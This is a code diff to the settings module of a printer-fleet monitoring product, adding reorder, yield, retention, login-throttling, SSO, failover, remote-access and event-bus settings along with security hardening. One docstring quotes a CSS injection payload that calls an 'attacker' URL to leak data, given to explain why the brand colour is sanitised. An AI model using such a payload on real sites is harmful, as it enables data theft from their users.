@@ -93,7 +93,15 @@ SPECS: List[Spec] = [
     # Generic webhook (PSA / PagerDuty / Zapier / etc.)
     Spec("webhook.enabled", "bool", "Webhook (generic)",
          "POST every alert to a custom URL", False),
-    Spec("webhook.url", "str", "Webhook (generic)", "Webhook URL", "",
+    # "secret", not "str": an incoming-webhook URL IS the credential -- whoever
+    # holds it can post to that channel -- which is exactly why the Slack and
+    # Teams ones above are secrets, and why webhook.auth_token two lines below
+    # is. This one was the odd man out, so the generic destination was the only
+    # channel URL stored in cleartext, rendered into the settings HTML instead
+    # of a placeholder, and carried verbatim in every pg_dump. The upgrade is
+    # lazy and needs no flag day: decrypt_value passes existing plaintext
+    # through unchanged, and the next settings save sweeps it into enc:v1:.
+    Spec("webhook.url", "secret", "Webhook (generic)", "Webhook URL", "",
          "JSON POST destination. See docs for the payload shape."),
     Spec("webhook.auth_header", "str", "Webhook (generic)", "Auth header name",
          "Authorization", "Header name for the credential (e.g. X-Api-Key)"),
@@ -115,7 +123,8 @@ SPECS: List[Spec] = [
     Spec("reports.monthly_enabled", "bool", "Reports",
          "Send a monthly billing CSV (inventory + page counts)", False),
     Spec("reports.monthly_day", "int", "Reports", "Monthly report day of month", 1,
-         "1-28 -- sent on the first worker cycle after the send hour that day"),
+         "1-31 -- sent on the first worker cycle after the send hour that day. "
+         "Clamped to the month's last day, so 31 still fires in February."),
     Spec("reports.send_hour", "int", "Reports", "Send hour (UTC, 0-23)", 7),
     Spec("reports.recipients", "str", "Reports", "Report recipients", "",
          "Comma-separated. Leave blank to use the alert email recipients."),
@@ -141,6 +150,13 @@ SPECS: List[Spec] = [
          "level climbs this far ABOVE it. Stops a cartridge reading just either "
          "side of the threshold from resolving and re-alerting every cycle. "
          "0 disables the margin (clears the moment it's back over the line)."),
+    Spec("alerts.occurrence_clear_margin_pct", "float", "Alerts",
+         "Occurrence-rate recovery margin (%)", 25.0,
+         "An occurrence-rate alert (“10 jams a day”) opens at its count "
+         "and only clears once the count in the window falls this far BELOW it. "
+         "Without a margin the alert resolves the moment one occurrence ages "
+         "out of the rolling window and re-opens on the very next one — which "
+         "is how flapping was invented. 0 disables the margin."),
     Spec("alerts.renotify_cooldown_min", "int", "Alerts", "Flap cooldown (minutes)", 30,
          "If a condition clears and re-fires within this window, re-open the "
          "original alert instead of raising a new one, and don't re-notify — "
@@ -157,6 +173,121 @@ SPECS: List[Spec] = [
          "One alert per distinct error code, capped here so a misbehaving "
          "device can't open dozens at once. Codes beyond the cap are counted "
          "in the detail of the alerts that do open, never dropped silently."),
+    # Supplies (reorder) — thresholds for the RECOMMEND-ONLY reorder surface
+    # (central.reorder). These decide what appears on the reorder list, in the
+    # portal panel and in the weekly report; they do not order anything, and
+    # nothing in this product ever will. Three independent triggers, because
+    # level alone is not enough: 20% of a cartridge is a fortnight on one device
+    # and an afternoon on another. Defaults are calibrated against what the
+    # incumbents do, cited per setting.
+    Spec("reorder.level_pct", "float", "Supplies (reorder)",
+         "Recommend at or below level (%)", 20.0,
+         "Konica Minolta's automated supply dispatch triggers at 20% remaining. "
+         "Set to 0 to switch the level trigger off and rely on the forecasts."),
+    Spec("reorder.days_remaining", "int", "Supplies (reorder)",
+         "…or at or below forecast days remaining", 21,
+         "Xerox ASR orders at 2–3 weeks of usage remaining. Fires off the "
+         "days-to-empty regression, so it accounts for how fast THIS device "
+         "actually consumes. 0 switches the days trigger off."),
+    Spec("reorder.pages_remaining", "int", "Supplies (reorder)",
+         "…or at or below forecast pages remaining", 500,
+         "Pages-remaining is stable where days-remaining is volatile: a quiet "
+         "week inflates the days estimate but not the page one, and this number "
+         "is directly comparable against the yield a cartridge is sold by. "
+         "0 switches the pages trigger off."),
+    Spec("reorder.urgent_level_pct", "float", "Supplies (reorder)",
+         "Treat as 'order now' at or below level (%)", 5.0,
+         "A cartridge this low is about to fail regardless of what the forecast "
+         "says, so it is promoted out of 'order soon' even with no estimate. "
+         "The other route to 'order now' is the reorder lead time above — a "
+         "supply that will not outlast delivery is already late."),
+    # Waste boxes and chip collectors fill up rather than run down (RFC 3805
+    # receptacleThatIsFilled), so they need their own pair of numbers. Reusing
+    # the two above would mean "20% remaining" and "80% full" moved together,
+    # which is two different policies on one slider.
+    Spec("reorder.receptacle_full_pct", "float", "Supplies (reorder)",
+         "Recommend a waste container at or above full (%)", 80.0,
+         "Waste toner boxes and chip collectors report how FULL they are, not "
+         "how much is left, so they are ordered when nearly full. Set to 0 to "
+         "switch the receptacle trigger off. The forecast triggers above never "
+         "apply here — a rising level yields no days- or pages-to-empty."),
+    Spec("reorder.urgent_receptacle_full_pct", "float", "Supplies (reorder)",
+         "Treat a waste container as 'order now' at or above full (%)", 95.0,
+         "A container this full is about to halt the printer, so it is promoted "
+         "out of 'order soon'."),
+    Spec("reorder.include_in_reports", "bool", "Supplies (reorder)",
+         "Include the reorder list in the weekly fleet email", True,
+         "Aggregated per client and per cartridge, so an MSP orders once rather "
+         "than once per device."),
+    # Outbound events. Default OFF: the recommendation surface works without an
+    # event bus, and publishing a customer's fleet to an external system is an
+    # opt-in decision, not a side effect of upgrading.
+    Spec("reorder.emit_events", "bool", "Supplies (reorder)",
+         "Publish supply.reorder_recommended events", False,
+         "Sends one typed event per recommended cartridge to the outbound event "
+         "bus so your ERP or PSA can act on it. Printer Nanny still places no "
+         "orders and holds no order state — a human orders every cartridge."),
+    Spec("reorder.emit_interval_min", "int", "Supplies (reorder)",
+         "Minimum minutes between event publishes", 1440,
+         "The worker cycles every 60s; a recommendation is a daily-grade "
+         "decision, so publishing every cycle would be a firehose of the same "
+         "facts. Each event carries a stable dedupe key regardless."),
+    # Supplies (yield) — pages actually delivered per cartridge, against what a
+    # cartridge is supposed to deliver (central.supply_yield). A persistent
+    # shortfall is the non-OEM / refill signal, and that is an ACCUSATION: it
+    # tells an MSP their customer is buying grey-market consumables. Every
+    # default here is therefore set so that saying nothing is the easy outcome
+    # and saying something takes real evidence.
+    Spec("yield.enabled", "bool", "Supplies (yield)",
+         "Measure pages per cartridge", True,
+         "Records a cartridge cycle each time a supply level RISES (the only "
+         "replacement signal a printer gives) and counts the pages printed "
+         "between one replacement and the next. Off means no cycles are "
+         "recorded and the yield report stays empty — it does not hide "
+         "measurements already taken."),
+    Spec("yield.scan_interval_min", "int", "Supplies (yield)",
+         "Scan for cartridge changes every (minutes)", 360,
+         "A cartridge change is a monthly-grade event, so this does not belong "
+         "on the 60-second worker cycle. Each pass reads only what arrived "
+         "since the last one, so a longer interval costs nothing in accuracy."),
+    Spec("yield.min_cycles", "int", "Supplies (yield)",
+         "Minimum completed cartridges before reporting", 3,
+         "One short cartridge is not evidence — it is a heavy month, a "
+         "duplex-off print run, or somebody swapping a cartridge early. Below "
+         "this count the report shows the measurement and states INSUFFICIENT "
+         "DATA rather than a verdict. Minimum 2; 1 would report a single "
+         "sample as a finding."),
+    Spec("yield.min_consumed_pct", "float", "Supplies (yield)",
+         "Ignore a cartridge that used less than (% of its level)", 60.0,
+         "A cartridge pulled at 70% remaining says nothing about its yield. "
+         "Cycles below this are recorded but excluded from the calculation. "
+         "Observed yield is scaled to a full cartridge by the level actually "
+         "consumed, so this is the point below which that scaling stops being "
+         "trustworthy."),
+    Spec("yield.shortfall_pct", "float", "Supplies (yield)",
+         "Flag when yield is below expected by (%)", 30.0,
+         "Deliberately conservative. A false positive here tells an MSP their "
+         "customer is buying grey-market cartridges, so the default only fires "
+         "on a shortfall too large to be page coverage or a heavy month. "
+         "Lower it only if you are prepared to check each finding by hand."),
+    Spec("yield.baseline_min_cycles", "int", "Supplies (yield)",
+         "Fleet baseline needs at least (cartridges)", 5,
+         "With no operator-entered expected yield, the expectation is the "
+         "MEDIAN pages-per-cartridge of the same model and supply across the "
+         "rest of the fleet. Below this many samples there is no baseline and "
+         "the report says so — it never falls back to a guess."),
+    Spec("yield.baseline_min_printers", "int", "Supplies (yield)",
+         "…from at least (other printers)", 3,
+         "Samples from one device are that device's habits, not a baseline. "
+         "The subject printer's own cartridges are always excluded from its "
+         "own baseline, or a printer running non-OEM would calibrate the "
+         "expectation to itself and never be flagged."),
+    Spec("yield.emit_events", "bool", "Supplies (yield)",
+         "Publish supply.replaced and supply.yield_below_expected events", False,
+         "Sends a typed event to the outbound event bus when a cartridge is "
+         "replaced, and when a slot's measured yield falls short. Off by "
+         "default: the report works without a bus, and publishing a customer's "
+         "consumable habits to an external system is an opt-in decision."),
     # ESG / Sustainability — turn page-count history into estimated print
     # footprint (paper, CO2e, energy, trees). Every factor is operator-tunable
     # so a customer can plug in their own paper stock / grid figures. Defaults
@@ -188,11 +319,82 @@ SPECS: List[Spec] = [
     Spec("polling.poll_interval_seconds", "int", "Polling", "Poll interval (seconds)", 300),
     Spec("polling.discovery_interval_seconds", "int", "Polling", "Discovery interval (seconds)", 3600),
     Spec("polling.heartbeat_interval_seconds", "int", "Polling", "Heartbeat interval (seconds)", 60),
+    # Dashboard auto-refresh -- the BROWSER's poll cadence, which is why it sits
+    # beside the agent's. Only the "data as of" indicator refreshes on it, never
+    # a whole page, so an open NOC screen re-asks one cheap question rather than
+    # re-running the fleet queries.
+    Spec("dashboard.autorefresh_enabled", "bool", "Dashboard",
+         "Auto-refresh the freshness indicator", True,
+         "Keeps the 'data as of' strip on fleet pages current without a reload. "
+         "Turn it off and the strip still reports the true age of the data at "
+         "the moment the page was loaded, and the age still counts up in the "
+         "browser — it just stops re-checking the server for newer readings."),
+    Spec("dashboard.autorefresh_seconds", "int", "Dashboard",
+         "Auto-refresh interval (seconds)", 60,
+         "Clamped to 15–3600. There is nothing to gain below the SNMP poll "
+         "interval above (300s by default): a faster browser refresh cannot "
+         "surface a reading the agents have not taken yet, it only re-asks the "
+         "same question once per open tab."),
     # SNMP defaults (pushed to agents)
     Spec("snmp.community", "str", "SNMP defaults", "Community", "public"),
     Spec("snmp.version", "str", "SNMP defaults", "Version (1 / 2c)", "2c"),
     Spec("snmp.timeout", "float", "SNMP defaults", "Timeout (seconds)", 2.0),
     Spec("snmp.retries", "int", "SNMP defaults", "Retries", 1),
+    # Data retention (central.retention -- rollup + opt-in prune of `readings`)
+    Spec("retention.rollup_enabled", "bool", "Data retention",
+         "Roll readings up into daily summaries", True,
+         "Collapses raw readings older than the raw window below into one row per "
+         "printer per UTC day — page/mono/colour meters plus end-of-day supply "
+         "levels — kept forever. Non-destructive on its own: raw readings are only "
+         "removed if you also switch on deletion below."),
+    Spec("retention.raw_days", "int", "Data retention", "Keep raw readings for (days)", 90,
+         "Readings older than this become eligible for rollup, and for deletion if "
+         "that is enabled. Supply-runway forecasts read raw readings only, over a "
+         "30-day window, so anything below 31 is refused and 31 used instead (the "
+         "worker logs it) — a shorter window would starve every estimate without "
+         "failing anywhere. Whole UTC days are rolled, so the window actually kept "
+         "is this many days or up to 24h more, never less."),
+    Spec("retention.delete_enabled", "bool", "Data retention",
+         "Delete raw readings once they are rolled up", False,
+         "DESTRUCTIVE AND IRREVERSIBLE — off by default. A raw reading is only ever "
+         "deleted in the same database transaction that commits its daily rollup, so "
+         "nothing can be removed that was not summarised first, and every pass that "
+         "deletes is written to the audit log."),
+    Spec("retention.max_batches_per_cycle", "int", "Data retention",
+         "Retention batches per worker cycle", 200,
+         "Caps how much retention work one cycle does. A batch is one day-scan or one "
+         "printer-day rollup+delete transaction. The worker runs under a single-leader "
+         "lock, so this is what stops a large backlog from stalling alerting — it "
+         "drains over many cycles instead of one long statement."),
+    # Login protection (central/ratelimit.py). Two independent scopes because
+    # each is the other's bypass: a per-username budget is defeated by spraying
+    # many usernames, and a per-source budget is defeated by spraying from many
+    # sources. Both are leaky buckets over the same window -- there is no
+    # "locked_until", so a lock always drains on its own and can never become a
+    # permanent denial of service against a real operator.
+    Spec("auth.lockout_enabled", "bool", "Login protection",
+         "Throttle failed sign-ins", True,
+         "Off means unlimited password guesses against every account. Leave it on."),
+    Spec("auth.lockout_user_threshold", "int", "Login protection",
+         "Failed sign-ins per username", 10,
+         "Failures within the window before that username stops being checked. "
+         "Applies to unknown usernames too, so it cannot be used to discover "
+         "which accounts exist."),
+    Spec("auth.lockout_ip_threshold", "int", "Login protection",
+         "Failed sign-ins per source address", 50,
+         "The username-rotation catch. Deliberately much higher than the "
+         "per-username budget: behind a reverse proxy with no trusted-proxy "
+         "list every operator shares one source address."),
+    Spec("auth.lockout_window_min", "int", "Login protection",
+         "Window (minutes)", 15,
+         "Failures older than this stop counting, so a throttle lifts by itself."),
+    Spec("auth.trusted_proxies", "str", "Login protection",
+         "Trusted proxy addresses", "",
+         "Comma-separated IPs/CIDRs of your reverse proxy (e.g. 172.16.0.0/12 for "
+         "the Docker bridge). SET THIS if you run behind one: without it every "
+         "request looks like it came from the proxy, so the per-source budget is "
+         "shared by everybody. X-Forwarded-For is honoured ONLY from these "
+         "addresses -- anywhere else it is attacker-supplied and ignored."),
     # Single sign-on (OIDC)
     Spec("oidc.enabled", "bool", "Single sign-on (OIDC)", "Enable SSO login", False),
     Spec("oidc.issuer", "str", "Single sign-on (OIDC)", "Issuer / discovery URL", "",
@@ -202,6 +404,17 @@ SPECS: List[Spec] = [
     Spec("oidc.scopes", "str", "Single sign-on (OIDC)", "Scopes", "openid email profile"),
     Spec("oidc.button_label", "str", "Single sign-on (OIDC)", "Login button label", "Sign in with SSO"),
     Spec("oidc.auto_provision", "bool", "Single sign-on (OIDC)", "Auto-create users on first login", True),
+    # OFF by default, because ON is an admin-takeover primitive. Without it, an
+    # SSO login whose email matched an existing PASSWORD account simply became
+    # that account -- so anyone who could get an address issued by the IdP (guest
+    # or self-service sign-up, both ordinary features) could land on the
+    # bootstrap admin. Turning it on is a real migration an MSP performs
+    # deliberately; leaving it off costs an operator one field on the user.
+    Spec("oidc.link_local_accounts", "bool", "Single sign-on (OIDC)",
+         "Let SSO adopt existing password accounts", False,
+         "Off by default. On, an SSO login whose email matches a local "
+         "account signs in AS that account -- enable only while migrating "
+         "known users to SSO."),
     Spec("oidc.default_role", "str", "Single sign-on (OIDC)", "Role for new SSO users", "tech"),
     # SCIM 2.0 provisioning (RFC 7644). Lets an IdP (Entra ID / Okta / etc.)
     # create, update and -- critically -- DEPROVISION (deactivate) users
@@ -276,6 +489,62 @@ SPECS: List[Spec] = [
          "root, which is a wider grant than the Windows path, so it is opted "
          "into rather than inherited. Uploads are audited with their digest "
          "either way."),
+    # Collector redundancy. Redundancy itself is opted into per SUBNET (by
+    # naming a standby agent on the Agents page); these only tune how the
+    # failover behaves once a subnet has one, so an install that never names a
+    # standby is unaffected by every one of them.
+    Spec("collector.lease_seconds", "int", "Collector redundancy",
+         "Collection lease length (seconds)", 900,
+         "How long a collection lease is granted for. The agent holding it stops "
+         "collecting when the lease runs out on its OWN clock, so this is also "
+         "the longest a disconnected agent keeps sweeping -- and a standby is "
+         "never handed a subnet before it elapses. Shorter fails over sooner; "
+         "longer tolerates a flakier link to central. Floored at 60s: a lease "
+         "shorter than the heartbeat interval would lapse between renewals."),
+    Spec("collector.takeover_after_seconds", "int", "Collector redundancy",
+         "Take over after primary silent for (seconds)", 900,
+         "A standby may only take over once the current collector has been "
+         "offline this long. Deliberately longer than the agent offline grace: "
+         "'briefly missed a heartbeat' and 'has stopped working' are different "
+         "events, and a collector that is merely slow must not be displaced."),
+    Spec("collector.auto_takeover", "bool", "Collector redundancy",
+         "Let a standby take over automatically", True,
+         "Off means a standby is configured but never activates on its own -- "
+         "collection stops until an operator hands the subnet over. On (the "
+         "default) the worker performs the handover, refusing unless the "
+         "collector really looks gone and the standby is alive, and audits it "
+         "as subnet.collector_takeover. A primary that comes back does NOT "
+         "reclaim the subnet either way; that is always an operator's decision."),
+    # Remote hands. The read proxy and the write channel are separate settings
+    # because they are separate risks: a GET to a device's own web page is
+    # something the Brother provider already does on every poll, while an SNMP
+    # SET changes the device. So reads ship ON and writes ship OFF, and turning
+    # writes on is an explicit, audited decision that still does not make any
+    # single device writable -- each one has to pass its own capability probe.
+    Spec("remote.enabled", "bool", "Remote hands",
+         "Allow viewing a device's web page", True,
+         "Lets an operator ask the site agent to fetch one page from a printer's "
+         "embedded web server and show it back, isolated. Read-only by "
+         "construction: no write ever travels this path. Off disables the whole "
+         "feature, writes included."),
+    Spec("remote.allow_writes", "bool", "Remote hands",
+         "Allow write actions on devices", False,
+         "Off (the default) means every device is read-only however capable it "
+         "is. On enables the named write actions -- set location / contact / "
+         "name, and restart -- but ONLY on devices that have passed the "
+         "capability check. A device is never assumed writable from its brand "
+         "or model, and an operator cannot pin one writable; they can only pin "
+         "one read-only."),
+    Spec("remote.min_interval_seconds", "int", "Remote hands",
+         "Minimum seconds between requests to one printer", 15,
+         "Rate limit, per printer. Stops a stuck page or an impatient refresh "
+         "turning the proxy into a scanner aimed at a customer's device. 0 "
+         "disables the interval check (the outstanding-request cap still applies)."),
+    Spec("remote.max_open_per_printer", "int", "Remote hands",
+         "Maximum unanswered requests per printer", 3,
+         "Commands are pulled on the agent's heartbeat, so an unbounded backlog "
+         "is work the agent will do minutes after anyone wanted it. 0 disables "
+         "this cap."),
     Spec("onboarding.apply_defaults", "bool", "Onboarding defaults",
          "Apply defaults to new clients", True,
          "When a client is created through Onboard, give it the starting alert "
@@ -306,6 +575,31 @@ SPECS: List[Spec] = [
     Spec("directory.sync_interval_min", "int", "Directory sync", "Sync every (minutes)", 60,
          "How often the worker refreshes each enabled connection. Directories change "
          "slowly; a short interval mostly buys API throttling."),
+    # Outbound event bus. The destinations and their signing secrets live on
+    # event_subscriptions, not here -- a global setting cannot hold one signing
+    # key per partner, and a secret in this table is rendered on the Settings
+    # page. These are the knobs that genuinely are install-wide.
+    Spec("events.enabled", "bool", "Event bus", "Send outbound events", True,
+         "Master switch. Off queues events without sending them; switching it "
+         "back on delivers the backlog."),
+    Spec("events.max_attempts", "int", "Event bus", "Max delivery attempts", 8,
+         "A delivery that fails this many times is dead-lettered instead of "
+         "retried forever. Backoff doubles each attempt, capped at an hour."),
+    Spec("events.retry_base_seconds", "int", "Event bus", "Retry base (seconds)", 60,
+         "First retry waits this long; each subsequent one doubles."),
+    Spec("events.timeout_seconds", "int", "Event bus", "Request timeout (seconds)", 15,
+         "A subscriber that does not answer in this long counts as a failed "
+         "attempt and is retried."),
+    Spec("events.retention_days", "int", "Event bus", "Keep delivered events for (days)", 30,
+         "Fully-delivered events older than this are pruned. Events with a "
+         "delivery still queued are always kept. 0 disables pruning."),
+    Spec("events.allow_private_destinations", "bool", "Event bus",
+         "Allow private / loopback destinations", False,
+         "Off by default: a subscription URL makes this server issue requests, "
+         "so an internal address is a way to probe your own network. Turn it on "
+         "only if the subscriber really is on this LAN (e.g. "
+         "http://helpdesk.lan:8080/hooks). Link-local and cloud-metadata "
+         "addresses stay refused either way."),
 ]
 
 SPEC_BY_KEY: Dict[str, Spec] = {s.key: s for s in SPECS}
@@ -318,13 +612,24 @@ SETTINGS_GROUPS: "Dict[str, tuple]" = {
     "branding": ("Branding", ["Branding"]),
     "notifications": (
         "Notifications",
-        ["Email (SMTP)", "Microsoft Teams", "Slack", "Webhook (generic)", "FreeScout"],
+        ["Email (SMTP)", "Microsoft Teams", "Slack", "Webhook (generic)", "FreeScout",
+         "Event bus"],
     ),
-    "alerts": ("Alerts & Reports", ["Alerts", "Reports", "ESG / Sustainability"]),
-    "polling": ("Polling & SNMP", ["Polling", "SNMP defaults"]),
+    "alerts": ("Alerts & Reports",
+               ["Alerts", "Supplies (reorder)", "Supplies (yield)", "Reports",
+                "ESG / Sustainability"]),
+    # Retention lives here because it is the other half of polling: how often we
+    # ask, and how long we keep what comes back.
+    # "Dashboard" is here because it is the third half of the same question:
+    # how often we ask the devices, how long we keep the answers, and how often
+    # the browser re-checks how old they are.
+    "polling": ("Polling & SNMP",
+                ["Polling", "Dashboard", "SNMP defaults", "Data retention"]),
     "auth": ("Authentication",
-             ["Single sign-on (OIDC)", "SCIM provisioning", "Directory sync"]),
-    "agents": ("Agents", ["Agent install", "Workstations", "Onboarding defaults"]),
+             ["Login protection", "Single sign-on (OIDC)", "SCIM provisioning",
+              "Directory sync"]),
+    "agents": ("Agents", ["Agent install", "Collector redundancy", "Remote hands",
+                          "Workstations", "Onboarding defaults"]),
 }
 DEFAULT_SETTINGS_GROUP = "branding"
 
@@ -439,21 +744,34 @@ def save_settings(
 
 
 def encrypt_existing_settings(db: Session) -> int:
-    """One-shot startup migration: encrypt every plaintext secret row.
+    """One-shot startup migration: bring every secret row up to the live key.
 
-    Idempotent (encrypted rows are skipped) and safe to race with the worker
-    (load_settings handles both forms). Returns the number of rows updated
-    so the caller can log it.
+    Two shapes are swept, both left over from an older install:
+
+    * plaintext, from before encryption-at-rest shipped;
+    * ciphertext sealed under a SECRET_KEY published in this repository, from
+      before ``config.resolve_secret_key`` generated a real one for this install.
+
+    Idempotent (rows already sealed under the live key are skipped) and safe to
+    race with the worker (``load_settings`` handles every form). Returns the
+    number of rows updated so the caller can log it.
     """
-    from central.secrets import encrypt_value, is_encrypted
+    from central.secrets import encrypt_value, is_encrypted, rewrap_if_legacy
 
     updated = 0
     for row in db.scalars(select(m.AppSetting)):
         spec = SPEC_BY_KEY.get(row.key)
         if spec is None or spec.type != "secret":
             continue
-        if isinstance(row.value, str) and row.value and not is_encrypted(row.value):
+        if not isinstance(row.value, str) or not row.value:
+            continue
+        if not is_encrypted(row.value):
             row.value = encrypt_value(row.value)
+            updated += 1
+            continue
+        rewrapped = rewrap_if_legacy(row.value)
+        if rewrapped is not None:
+            row.value = rewrapped
             updated += 1
     if updated:
         db.commit()
@@ -465,13 +783,33 @@ def app_branding(db: Session) -> Dict[str, Any]:
 
     Single query per render so the nav, login page, and footer can stay
     operator-controlled without each template knowing about ``runtime``.
+
+    ``primary_color`` is passed through ``safe_css_color`` on the way out.
+    base.html interpolates it into a ``style`` attribute, where autoescaping
+    stops an attribute breakout but not CSS itself -- ``red; background-image:
+    url(https://attacker/?c=)`` stays inside the declaration and still calls
+    out. Guarding at the sink covers values that predate the input validation,
+    values put there by a direct DB edit, and any future writer. ``logo_url``
+    is re-checked the same way, for the same reason.
     """
+    from central.branding import safe_css_color, safe_logo_url
+
     full = load_settings(db)
-    return {
+    out = {
         key.split(".", 1)[1]: value
         for key, value in full.items()
         if key.startswith("app.")
     }
+    out["primary_color"] = safe_css_color(out.get("primary_color"))
+    # Same re-check on the way out that `apply_client_overrides` already does
+    # for the per-client logo. The global value was the asymmetric one: it is
+    # operator free-text landing in an `<img src>`, it renders on **login.html**
+    # and so is served pre-auth, and nothing validated it on either the input or
+    # the output side. `javascript:` happens to be inert in `<img src>` today,
+    # which is exactly the "inert in the one place it is used right now"
+    # property `safe_logo_url`'s own comment says not to depend on.
+    out["logo_url"] = safe_logo_url(out.get("logo_url")) or ""
+    return out
 
 
 def masked_for_form(values: Dict[str, Any]) -> Dict[str, Any]:
